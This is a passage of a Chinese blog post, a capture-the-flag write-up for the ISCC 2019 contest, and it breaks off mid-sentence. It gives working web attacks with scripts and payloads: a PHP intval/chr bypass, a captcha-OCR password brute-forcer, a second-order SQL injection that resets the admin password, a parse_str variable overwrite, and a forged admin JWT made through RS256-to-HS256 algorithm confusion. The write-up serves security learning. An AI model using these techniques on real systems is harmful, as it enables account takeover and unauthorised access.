@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>ISCC 2019 Writeup | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC 2019 Writeup">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/59602/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/29.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/17.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/18.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/19.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/28.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/20.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/21.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/22.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/23.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/24.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/13.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/14.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/15.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/16.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/25.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/26.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ISCC2019/27.png">
+<meta property="og:updated_time" content="2019-05-25T05:14:05.776Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC 2019 Writeup">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/ISCC2019/29.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ISCC 2019 Writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web1"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">web1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web2"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">web2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web3"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">web3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web4"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">web4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web6"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">web6</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web5"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">web5</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc"><span class="post-toc-number">2.</span> <span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#隐藏的信息"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">隐藏的信息</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#倒立屋"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">倒立屋</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Keyes’-secret"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">Keyes’ secret</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Aesop’s-secret"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">Aesop’s secret</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#他们能在一起吗"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">他们能在一起吗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Welcome"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">Welcome</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#无法运行的exe"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">无法运行的exe</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最危险的地方就是最安全的地方"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">最危险的地方就是最安全的地方</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#解密成绩单"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">解密成绩单</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#High起来！"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">High起来！</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#碎纸机"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">碎纸机</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-ISCC2019"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ISCC 2019 Writeup</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-05-25 12:15:00" datetime="2019-05-25T04:15:00.000Z"  itemprop="datePublished">2019-05-25</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">21</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的（滑稽）。但是不得不说，参加这比赛还是学到蛮多套路的，脑洞大开，以及让人摸不着头的flag提交格式emmm<a id="more"></a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\29.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>首先要求输入的<strong>value</strong>的<strong>ascii</strong>码不在可见范围之内，但是最后要求value经过chr拼接后的username为’w3lc0me_To_ISCC2019’</p>
+<p>php的chr函数会自动进行<strong>mod256</strong>，所以使用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"w3lc0me_To_ISCC2019"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">"&amp;value[]="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">    value = ord(i) + <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    payload = payload + s1 + str(value)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313</span><br></pre></td></tr></table></figure>
+<p>再来就是要绕过<code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333</code></p>
+<p>intval函数处理字符串时，会从头开始检测到除数字以外的字母为止</p>
+<p>我们注意到<strong>intval($password + 1) &gt; 2333</strong></p>
+<p>是先将$password + 1后再经过intval函数的处理，如果$password传入的是十六进制数，例如0x10，那么intval(‘0x10’)结果为0，intval(‘0x10’ + 1)结果为17，这个特性在<strong>7.0以上版本不适用</strong></p>
+<p>所以只需要把2333转换成16进制即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\17.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p><strong>payload:password=0x91d</strong></p>
+<p>所以最后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x91d</span><br></pre></td></tr></table></figure>
+<p>flag：<code>flag{8311873e241ccad54463eaa5d4efc1e9}</code></p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>爆破三位数字密码，有图片验证码，需要借助python的pytesseract和Image库来识别图片验证码 </p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">image_url = <span class="string">"http://39.100.83.188:8002/vcode.php"</span></span><br><span class="line">pass_url = <span class="string">'http://39.100.83.188:8002/login.php'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">password = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageCode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------开始识别验证码'</span>)</span><br><span class="line">        imageURL = image_url</span><br><span class="line">        image = s.get(url=imageURL)</span><br><span class="line">        captcha_img = Image.open(BytesIO(image.content))</span><br><span class="line">        imageCode = pytesseract.image_to_string(captcha_img)</span><br><span class="line">        print(<span class="string">'验证码识别结果:'</span>,imageCode)</span><br><span class="line">        print(<span class="string">'--------------------开始校验验证码'</span>)</span><br><span class="line">        match = re.search(<span class="string">r'^[a-z | 0-9]&#123;4&#125;$'</span>,imageCode)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验结果识别失败，继续识别'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验成功'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> imageCode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        passwd = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> len(str(password)) != <span class="number">3</span>:</span><br><span class="line">            count = <span class="number">3</span> - len(str(password))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+<span class="number">1</span>):</span><br><span class="line">                passwd = passwd + <span class="string">"0"</span></span><br><span class="line">        passwd = passwd + str(password)</span><br><span class="line">        print(<span class="string">'--------------------------------------开始猜测密码'</span>)</span><br><span class="line">        imageCode = getImageCode()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'pwd'</span>:passwd,</span><br><span class="line">            <span class="string">'user_code'</span>:imageCode</span><br><span class="line">            &#125;</span><br><span class="line">        g = s.post(url=pass_url,data=data)</span><br><span class="line">        g.encoding = g.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(g.text)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'密码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'密码:'</span>,passwd,<span class="string">'错误'</span>)</span><br><span class="line">            password +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            print(<span class="string">'密码:'</span>,passwd,<span class="string">'正确'</span>)</span><br><span class="line">            print(<span class="string">'返回的页面结果:'</span>)</span><br><span class="line">            print(g.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">guess(password)</span><br></pre></td></tr></table></figure>
+<p>但是这题听说可以删掉cookie后直接绕过验证码，密码是<strong>996</strong></p>
+<p>flag：<code>flag{996_ICU}</code></p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>sql-labs 24关原题，考察<strong>二次注入</strong></p>
+<p>注入点在login_create.php中的<strong>username</strong>字段，注册用户名为<strong>admin’#</strong></p>
+<p>之后登录admin’#，username字段就赋值给了<strong>session</strong>中的username字段</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\18.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>在password_change.php中的$username是直接从session中取出的，也就是取出的username为admin’#</p>
+<p>拼接到sql语句中：</p>
+<figure class="highlight plain"><figcaption><span>users SET PASSWORD</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;123&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p>用户的密码就被修改为123</p>
+<p>但是坑的地方在于这题没有设置容器，所有人共用一个数据库，可能很多人同时一起修改了admin用户的密码，所以有时候修改admin的密码后登陆不成功，并且这个数据库会定时修改所有用户的密码</p>
+<p>所以能稳定登陆admin的方法是持续发送修改密码的包，如果admin’#用户被注册，注册admin’########也是可以的</p>
+<p>最终登陆成功页面：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\19.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure> 
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\28.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>考察parse_str<strong>变量覆盖</strong></p>
+<p>payload:<a href="http://39.100.83.188:8066/index.php?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1" target="_blank" rel="noopener">http://39.100.83.188:8066/index.php?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1</a></p>
+<p>flag{7he_rea1_f1@g_15_4ere}</p>
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>抓包发现是<code>python</code>写的网站，一开始有点慌，不过这题不是查考察python</p>
+<p>我们登陆一个用户时抓包可以发现头部存在<strong>认证</strong>字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: iscc19 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGh4NjY2IiwicHJpdiI6Im90aGVyIn0.vwB2Jj8TyGQhO6i0EEw6vCIrplCxrh23ZHQ15aWeeoQkYsd5tDSu3cixf-faEfQbLkB-_-6EF4DVxGbR5zGp4MyQn90KeRooOF65xQViZ8qRUVvylU5pJBDCcs-XEE-GdD6qfARNFpdg8toggC0ld5l5OJbeAA9au00xiaCxhzs</span><br></pre></td></tr></table></figure>
+<p>很明显是这个网站采用了<strong>JWT身份验证</strong>，类似于Session机制，<strong>JWT</strong>的token结构是<strong>Json</strong>格式，同时将认证信息以经过<strong>加密算法</strong>处理后存储在头部的<code>Authorization</code>字段</p>
+<p>根据题目页面的提示：只有<strong>admin</strong>身份才能查看flag，那么这题多半就是考察伪造<strong>admin</strong>身份的认证字段登陆</p>
+<p>我们可以将我们注册用户的认证字段拉近<strong>JWT</strong>的<a href="https://jwt.io/" target="_blank" rel="noopener">生成网站</a>进行解密</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解密后得到的字段正是<strong>JWT</strong>的token三个组成部分：</p>
+<ul>
+<li>Header：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>alg</code>为算法的缩写，说明这串<strong>认证字符</strong>是经过<strong>RS256</strong>加密的。<code>typ</code>为类型的缩写</p>
+<ul>
+<li>Payload：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hhx666&quot;,</span><br><span class="line">  &quot;priv&quot;: &quot;other&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这些是用户的信息</p>
+<ul>
+<li>Signature：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64Encode(header) + &quot;.&quot; +</span><br><span class="line">  base64Encode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+<p>这部分就是加密算法所使用的<strong>密钥</strong></p>
+<p>常见的加密算法有<strong>RS256</strong>和<strong>HS256</strong>，<strong>RS256</strong>是非对称加密，需要公钥和私钥才能对数据进行篡改，一般私钥我们是拿不到的，就像这题的认证字段正是经过<strong>RS256</strong>加密，而<strong>HS256</strong>则是对称加密，只需要公钥就可以进行伪造</p>
+<p>在<a href="http://39.100.83.188:8053/static/js/common.js" target="_blank" rel="noopener">http://39.100.83.188:8053/static/js/common.js</a> 源码处我们可以看到<code>public key</code>存放目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getpubkey()&#123;</span><br><span class="line">    /* </span><br><span class="line">    get the pubkey for test</span><br><span class="line">    /pubkey/&#123;md5(username+password)&#125;</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>/pubkey</code>正是存放公钥的目录，它提示了我们公钥可以通过我们注册的用户名和密码的md5加密进行查看，我们访问<a href="http://39.100.83.188:8053/pubkey/7035124f823530ce2af7fb19bb625304" target="_blank" rel="noopener">http://39.100.83.188:8053/pubkey/7035124f823530ce2af7fb19bb625304</a> 可以看到此RS256加密算法采用的<strong>公钥</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p>因为私钥无法获取到，所以这时我们就需要将算法修改为<strong>HS256</strong>,如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。 </p>
+<p>生成认证字段的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"><span class="keyword">print</span> jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"iscc19"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>)</span><br></pre></td></tr></table></figure>
+<p>说明一下<code>1.txt</code>中存放的公钥为：</p>
